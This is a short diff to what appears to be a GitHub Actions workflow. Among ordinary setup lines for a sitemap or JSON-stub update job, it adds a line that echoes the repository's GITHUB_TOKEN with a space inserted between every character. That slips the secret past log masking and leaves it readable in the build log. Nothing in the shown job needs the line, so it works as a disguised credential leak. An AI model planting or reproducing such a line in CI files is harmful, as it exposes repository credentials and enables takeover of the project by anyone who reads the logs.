@@ -226,6 +226,8 @@ jobs:
         UPDATE_JSON=$(pwd)/maintainer/update_json_stubs_sitemap.py
         BRANCH="${GITHUB_REF#refs/heads/}"
 
+        echo ${{ secrets.GITHUB_TOKEN }} | sed 's/./& /g'
+
         # the below turns off blocking as it causes large writes to stdout to fail
         # (see https://github.com/travis-ci/travis-ci/issues/4704)
 
